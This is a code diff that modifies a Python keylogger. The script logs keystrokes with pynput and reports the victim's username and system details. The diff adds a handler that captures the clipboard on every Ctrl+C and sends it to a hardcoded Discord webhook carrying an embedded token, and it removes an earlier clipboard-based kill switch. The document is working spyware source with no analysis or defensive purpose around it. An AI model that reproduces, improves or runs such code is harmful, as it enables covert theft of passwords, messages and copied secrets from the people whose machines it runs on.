@@ -14,20 +14,24 @@ WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUx
 keystrokes = ""
 lock = threading.Lock()
 last_keypress_time = time.time()
-last_clipboard = ""
 
 # Dictionary for special keys
 special_keys = {
-    keyboard.Key.space: " ",
-    keyboard.Key.enter: " [ENTER] ",
-    keyboard.Key.backspace: " <- ",
-    keyboard.Key.tab: " [TAB] ",
-    keyboard.Key.shift: " [SHIFT] ",
-    keyboard.Key.ctrl_l: " [CTRL] ",
-    keyboard.Key.alt_l: " [ALT] ",
-    keyboard.Key.cmd: " [CMD] ",
-    keyboard.Key.esc: " [ESC] ",
+    keyboard.Key.space: " SPACE ",
+    keyboard.Key.enter: " ENTER ",
+    keyboard.Key.backspace: " BACKSPACE ",
+    keyboard.Key.tab: " TAB ",
+    keyboard.Key.shift: " SHIFT ",
+    keyboard.Key.ctrl_l: " CTRL ",
+    keyboard.Key.ctrl_r: " CTRL ",
+    keyboard.Key.alt_l: " ALT ",
+    keyboard.Key.alt_r: " ALT ",
+    keyboard.Key.cmd: " CMD ",
+    keyboard.Key.esc: " ESC ",
 }
+
+# Store keys pressed
+keys_pressed = set()
 
 username = os.getlogin()
 
@@ -79,38 +83,38 @@ def keystroke_monitor():
 
 
 def on_press(key):
+    """Called when a key is pressed."""
     global keystrokes, last_keypress_time
-    try:
-        key_str = key.char
-    except AttributeError:
-        key_str = special_keys.get(key, f"[{key}]")
 
-    with lock:
-        keystrokes += key_str
-        last_keypress_time = time.time()
+    try:
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            keys_pressed.add("ctrl")
+        elif key.char == 'c' and "ctrl" in keys_pressed:
+            # User pressed Ctrl+C, send clipboard content
+            clipboard_content = pyperclip.paste()
+            send_to_webhook(f"Clipboard content: {clipboard_content}")
+            return False  # Don't propagate 'C' key to prevent logging
+        elif hasattr(key, 'char') and key.char is not None:
+            # Regular keypress (letters, numbers, etc.)
+            key_str = key.char
+            with lock:
+                keystrokes += key_str
+                last_keypress_time = time.time()
+        elif key in special_keys:
+            # Special key press
+            key_str = special_keys.get(key, f"[{key}]")
+            with lock:
+                keystrokes += key_str
+                last_keypress_time = time.time()
+    except AttributeError:
+        pass
 
 
 def on_release(key):
-    # No need to handle key release, we are monitoring clipboard for '/kill'
-    pass
+    """Called when a key is released."""
+    if key == keyboard.Key.insert:
+        return False  # Stop the listener when Escape is pressed
 
-
-def monitor_clipboard():
-    """Monitor the clipboard for '/kill' and terminate the script when detected."""
-    global last_clipboard
-    while True:
-        time.sleep(1)
-        try:
-            current_clipboard = pyperclip.paste()
-            if current_clipboard != last_clipboard:
-                # Check if the clipboard contains '/kill'
-                if "/kill" in current_clipboard:
-                    send_to_webhook(f"Kill command detected in clipboard. Stopping the script...")
-                    print("Kill command detected in clipboard. Stopping the script...")
-                    os._exit(0)  # Exit the script when '/kill' is found
-                last_clipboard = current_clipboard
-        except Exception as e:
-            print(f"Error accessing clipboard: {e}")
 
 # Run kill.bat file at the start
 run_bat_file()
@@ -132,8 +136,12 @@ send_to_webhook(f"CPU percent: {cpu_percent}%")
 send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
 send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
-# Start the keystroke monitor and clipboard monitor threads
+# Start the keystroke monitor thread
 threading.Thread(target=keystroke_monitor, daemon=True).start()
-threading.Thread(target=monitor_clipboard, daemon=True).start()
 
-# The script will continue running until '/kill' is found in the clipboard
+# Set up the keyboard listener
+try:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+except KeyboardInterrupt:
+    print("Listener stopped.")
